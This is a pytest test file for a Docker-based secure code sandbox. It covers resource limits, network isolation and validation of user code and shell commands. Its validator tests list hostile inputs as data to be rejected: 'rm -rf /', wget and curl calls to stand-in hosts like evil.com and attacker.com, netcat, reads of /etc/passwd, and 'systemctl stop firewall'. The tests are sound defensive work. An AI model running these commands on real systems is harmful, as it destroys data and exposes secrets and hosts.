"""
Tests for the secure sandbox environment.
"""

import asyncio
import os
import tempfile
import pytest
from unittest.mock import Mock, patch, MagicMock

from backend.sandbox import (
    SecureSandbox,
    SandboxConfig,
    ExecutionResult,
    SandboxError,
    SecurityViolationError,
    ResourceLimitError,
    SandboxTimeoutError,
    ContainerCreationError,
    CodeExecutionError
)


class TestSandboxConfig:
    """Test SandboxConfig dataclass."""
    
    def test_default_config(self):
        """Test default configuration values."""
        config = SandboxConfig()
        
        assert config.memory_limit == "512m"
        assert config.cpu_limit == 0.5
        assert config.timeout_seconds == 30
        assert config.network_mode == "none"
        assert config.readonly_rootfs is True
        assert config.no_new_privileges is True
        assert config.james_dir == "~/.james"
        assert config.temp_dir_size == "100m"
        assert config.base_image == "python:3.11-slim"
        assert config.remove_container is True
    
    def test_custom_config(self):
        """Test custom configuration values."""
        config = SandboxConfig(
            memory_limit="1g",
            cpu_limit=1.0,
            timeout_seconds=60,
            base_image="python:3.12-slim"
        )
        
        assert config.memory_limit == "1g"
        assert config.cpu_limit == 1.0
        assert config.timeout_seconds == 60
        assert config.base_image == "python:3.12-slim"


class TestExecutionResult:
    """Test ExecutionResult dataclass."""
    
    def test_execution_result_creation(self):
        """Test ExecutionResult creation."""
        result = ExecutionResult(
            success=True,
            stdout="Hello, World!",
            stderr="",
            exit_code=0,
            execution_time=1.5,
            resource_usage={"memory_usage": 1024},
            security_violations=[]
        )
        
        assert result.success is True
        assert result.stdout == "Hello, World!"
        assert result.stderr == ""
        assert result.exit_code == 0
        assert result.execution_time == 1.5
        assert result.resource_usage == {"memory_usage": 1024}
        assert result.security_violations == []


class TestSecureSandbox:
    """Test SecureSandbox class."""
    
    @pytest.fixture
    def mock_docker_client(self):
        """Mock Docker client."""
        with patch('backend.sandbox.sandbox.docker.from_env') as mock_docker:
            mock_client = Mock()
            mock_docker.return_value = mock_client
            mock_client.ping.return_value = True
            yield mock_client
    
    @pytest.fixture
    def sandbox(self, mock_docker_client):
        """Create SecureSandbox instance with mocked Docker."""
        config = SandboxConfig(timeout_seconds=5)  # Short timeout for tests
        return SecureSandbox(config)
    
    def test_sandbox_initialization(self, mock_docker_client):
        """Test sandbox initialization."""
        sandbox = SecureSandbox()
        assert sandbox.config is not None
        assert sandbox.docker_client is not None
        mock_docker_client.ping.assert_called_once()
    
    def test_sandbox_initialization_failure(self):
        """Test sandbox initialization failure."""
        with patch('backend.sandbox.sandbox.docker.from_env') as mock_docker:
            mock_docker.side_effect = Exception("Docker not available")
            
            with pytest.raises(SandboxError, match="Docker initialization failed"):
                SecureSandbox()
    
    def test_validate_code_safe(self, sandbox):
        """Test code validation with safe code."""
        safe_code = """
def hello():
    return "Hello, World!"

print(hello())
"""
        # Should not raise any exception
        sandbox._validate_code(safe_code, "python")
    
    def test_validate_code_dangerous_patterns(self, sandbox):
        """Test code validation with dangerous patterns."""
        dangerous_codes = [
            "import os",
            "import subprocess", 
            "eval('malicious code')",
            "exec('dangerous')",
            "open('/etc/passwd')",
            "__import__('os')",
        ]
        
        for code in dangerous_codes:
            with pytest.raises(SecurityViolationError):
                sandbox._validate_code(code, "python")
    
    def test_validate_code_network_patterns(self, sandbox):
        """Test code validation with network-related patterns."""
        network_codes = [
            "import socket",
            "import urllib",
            "import requests",
            "from urllib import request",
            "from requests import get",
        ]
        
        for code in network_codes:
            with pytest.raises(SecurityViolationError):
                sandbox._validate_code(code, "python")
    
    def test_validate_terminal_command_safe(self, sandbox):
        """Test terminal command validation with safe commands."""
        safe_commands = [
            "ls -la",
            "echo 'hello'",
            "cat file.txt",
            "grep pattern file.txt",
            "python script.py",
        ]
        
        for command in safe_commands:
            # Should not raise any exception
            sandbox._validate_terminal_command(command)
    
    def test_validate_terminal_command_dangerous(self, sandbox):
        """Test terminal command validation with dangerous commands."""
        dangerous_commands = [
            "rm -rf /",
            "sudo rm file",
            "wget http://malicious.com/script",
            "curl -X POST http://evil.com",
            "ssh user@host",
            "docker run malicious",
            "systemctl stop service",
        ]
        
        for command in dangerous_commands:
            with pytest.raises(SecurityViolationError):
                sandbox._validate_terminal_command(command)
    
    def test_prepare_code_file_python(self, sandbox):
        """Test code file preparation for Python."""
        with tempfile.TemporaryDirectory() as temp_dir:
            code = "print('Hello, World!')"
            code_file = sandbox._prepare_code_file(code, "python", temp_dir)
            
            assert code_file.endswith("code.py")
            assert os.path.exists(code_file)
            
            with open(code_file, "r") as f:
                assert f.read() == code
    
    def test_prepare_code_file_bash(self, sandbox):
        """Test code file preparation for Bash."""
        with tempfile.TemporaryDirectory() as temp_dir:
            code = "echo 'Hello, World!'"
            code_file = sandbox._prepare_code_file(code, "bash", temp_dir)
            
            assert code_file.endswith("code.sh")
            assert os.path.exists(code_file)
            assert os.access(code_file, os.X_OK)  # Check executable
            
            with open(code_file, "r") as f:
                assert f.read() == code
    
    def test_prepare_code_file_unsupported_language(self, sandbox):
        """Test code file preparation with unsupported language."""
        with tempfile.TemporaryDirectory() as temp_dir:
            with pytest.raises(SandboxError, match="Unsupported language"):
                sandbox._prepare_code_file("code", "java", temp_dir)
    
    def test_get_execution_command_python(self, sandbox):
        """Test execution command for Python."""
        command = sandbox._get_execution_command("python")
        assert command == ["python", "/sandbox/code.py"]
    
    def test_get_execution_command_bash(self, sandbox):
        """Test execution command for Bash."""
        command = sandbox._get_execution_command("bash")
        assert command == ["bash", "/sandbox/code.sh"]
    
    def test_get_execution_command_unsupported(self, sandbox):
        """Test execution command for unsupported language."""
        with pytest.raises(SandboxError, match="Unsupported language"):
            sandbox._get_execution_command("java")
    
    def test_extract_resource_usage(self, sandbox):
        """Test resource usage extraction."""
        stats = {
            "memory_stats": {
                "usage": 1024000,
                "limit": 536870912
            },
            "cpu_stats": {
                "cpu_usage": {"total_usage": 500000000},
                "system_cpu_usage": 1000000000
            }
        }
        
        usage = sandbox._extract_resource_usage(stats)
        
        assert usage["memory_usage"] == 1024000
        assert usage["memory_limit"] == 536870912
        assert usage["cpu_usage"] == 500000000
        assert usage["system_cpu_usage"] == 1000000000
    
    def test_extract_resource_usage_empty_stats(self, sandbox):
        """Test resource usage extraction with empty stats."""
        usage = sandbox._extract_resource_usage({})
        assert usage == {}
    
    @pytest.mark.asyncio
    async def test_execute_code_success(self, sandbox, mock_docker_client):
        """Test successful code execution."""
        # Mock container behavior
        mock_container = Mock()
        mock_container.wait.return_value = {"StatusCode": 0}
        mock_container.logs.return_value = b"Hello, World!"
        mock_container.stats.return_value = {
            "memory_stats": {"usage": 1024, "limit": 536870912},
            "cpu_stats": {"cpu_usage": {"total_usage": 100}, "system_cpu_usage": 1000}
        }
        
        mock_docker_client.containers.run.return_value = mock_container
        
        # Mock os.makedirs to avoid creating actual directories
        with patch('os.makedirs'), patch('os.path.expanduser', return_value="/tmp/james"):
            code = "print('Hello, World!')"
            result = await sandbox.execute_code(code, "python")
            
            assert result.success is True
            assert result.stdout == "Hello, World!"
            assert result.exit_code == 0
            assert result.execution_time > 0
            assert "memory_usage" in result.resource_usage
    
    @pytest.mark.asyncio
    async def test_execute_code_security_violation(self, sandbox):
        """Test code execution with security violation."""
        dangerous_code = "import os; os.system('rm -rf /')"
        
        result = await sandbox.execute_code(dangerous_code, "python")
        
        assert result.success is False
        assert "Security violations detected" in result.stderr
        assert result.exit_code == -1
    
    @pytest.mark.asyncio
    async def test_execute_terminal_command_success(self, sandbox, mock_docker_client):
        """Test successful terminal command execution."""
        # Mock container behavior
        mock_container = Mock()
        mock_container.wait.return_value = {"StatusCode": 0}
        mock_container.logs.return_value = b"file1.txt\nfile2.txt"
        mock_container.stats.return_value = {}
        
        mock_docker_client.containers.run.return_value = mock_container
        
        with patch('os.makedirs'), patch('os.path.expanduser', return_value="/tmp/james"):
            result = await sandbox.execute_terminal_command("ls -la")
            
            assert result.success is True
            assert "file1.txt" in result.stdout
    
    @pytest.mark.asyncio
    async def test_execute_terminal_command_dangerous(self, sandbox):
        """Test terminal command execution with dangerous command."""
        with pytest.raises(SecurityViolationError, match="Dangerous command detected"):
            await sandbox.execute_terminal_command("rm -rf /")
    
    def test_context_manager(self, mock_docker_client):
        """Test sandbox as context manager."""
        with SecureSandbox() as sandbox:
            assert sandbox.docker_client is not None
        
        # Cleanup should be called automatically
    
    def test_cleanup(self, sandbox, mock_docker_client):
        """Test sandbox cleanup."""
        # Mock containers list
        mock_container = Mock()
        mock_docker_client.containers.list.return_value = [mock_container]
        
        sandbox.cleanup()
        
        mock_docker_client.containers.list.assert_called_once()
        mock_container.remove.assert_called_once_with(force=True)


class TestSandboxIntegration:
    """Integration tests for sandbox functionality."""
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_real_python_execution(self):
        """Test real Python code execution (requires Docker)."""
        try:
            sandbox = SecureSandbox()
            
            # Simple Python code
            code = """
result = 2 + 2
print(f"Result: {result}")
"""
            
            result = await sandbox.execute_code(code, "python")
            
            assert result.success is True
            assert "Result: 4" in result.stdout
            assert result.exit_code == 0
            
        except SandboxError:
            pytest.skip("Docker not available for integration test")
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_real_bash_execution(self):
        """Test real Bash command execution (requires Docker)."""
        try:
            sandbox = SecureSandbox()
            
            result = await sandbox.execute_terminal_command("echo 'Integration test'")
            
            assert result.success is True
            assert "Integration test" in result.stdout
            assert result.exit_code == 0
            
        except SandboxError:
            pytest.skip("Docker not available for integration test")
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_resource_limits(self):
        """Test resource limit enforcement (requires Docker)."""
        try:
            config = SandboxConfig(
                memory_limit="50m",  # Very low memory limit
                timeout_seconds=2    # Short timeout
            )
            sandbox = SecureSandbox(config)
            
            # Memory-intensive code
            memory_hog_code = """
data = []
for i in range(1000000):
    data.append('x' * 1000)
"""
            
            result = await sandbox.execute_code(memory_hog_code, "python")
            
            # Should fail due to resource limits
            assert result.success is False or result.execution_time >= 2
            
        except SandboxError:
            pytest.skip("Docker not available for integration test")
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_james_directory_access(self):
        """Test access to James directory (requires Docker)."""
        try:
            sandbox = SecureSandbox()
            
            # Code that writes to James directory
            code = """
import os
os.makedirs('/james/test', exist_ok=True)
with open('/james/test/file.txt', 'w') as f:
    f.write('Hello from sandbox!')

with open('/james/test/file.txt', 'r') as f:
    content = f.read()
    print(f"File content: {content}")
"""
            
            result = await sandbox.execute_code(code, "python", allow_file_ops=True)
            
            assert result.success is True
            assert "Hello from sandbox!" in result.stdout
            
            # Verify file was created in actual James directory
            james_dir = os.path.expanduser("~/.james")
            test_file = os.path.join(james_dir, "test", "file.txt")
            
            if os.path.exists(test_file):
                with open(test_file, "r") as f:
                    assert f.read() == "Hello from sandbox!"
                
                # Clean up
                os.remove(test_file)
                os.rmdir(os.path.dirname(test_file))
            
        except SandboxError:
            pytest.skip("Docker not available for integration test")


class TestSandboxSecurity:
    """Security-focused tests for sandbox."""
    
    @pytest.mark.security
    def test_network_isolation(self):
        """Test that network access is blocked."""
        # This would require actual Docker testing
        # For now, we verify the configuration
        config = SandboxConfig()
        assert config.network_mode == "none"
    
    @pytest.mark.security
    def test_filesystem_isolation(self):
        """Test filesystem isolation settings."""
        config = SandboxConfig()
        assert config.readonly_rootfs is True
        assert config.no_new_privileges is True
    
    @pytest.mark.security
    def test_resource_limits_configuration(self):
        """Test resource limit configuration."""
        config = SandboxConfig()
        assert config.memory_limit == "512m"
        assert config.cpu_limit == 0.5
        assert config.timeout_seconds == 30
        assert config.temp_dir_size == "100m"
    
    @pytest.mark.security
    def test_dangerous_code_patterns(self):
        """Test detection of dangerous code patterns."""
        sandbox = SecureSandbox()
        
        dangerous_patterns = [
            "import os",
            "import subprocess",
            "import sys", 
            "__import__('os')",
            "eval('code')",
            "exec('code')",
            "open('/etc/passwd')",
            "compile('code', 'file', 'exec')",
            "globals()",
            "locals()",
        ]
        
        for pattern in dangerous_patterns:
            with pytest.raises(SecurityViolationError):
                sandbox._validate_code(pattern, "python")
    
    @pytest.mark.security
    def test_dangerous_terminal_commands(self):
        """Test detection of dangerous terminal commands."""
        sandbox = SecureSandbox()
        
        dangerous_commands = [
            "rm -rf /",
            "sudo su",
            "chmod +x malicious",
            "wget http://evil.com/script",
            "curl -X POST http://attacker.com",
            "nc -l 1234",
            "ssh user@host",
            "docker run --privileged",
            "systemctl stop firewall",
            "mount /dev/sda1 /mnt",
        ]
        
        for command in dangerous_commands:
            with pytest.raises(SecurityViolationError):
                sandbox._validate_terminal_command(command)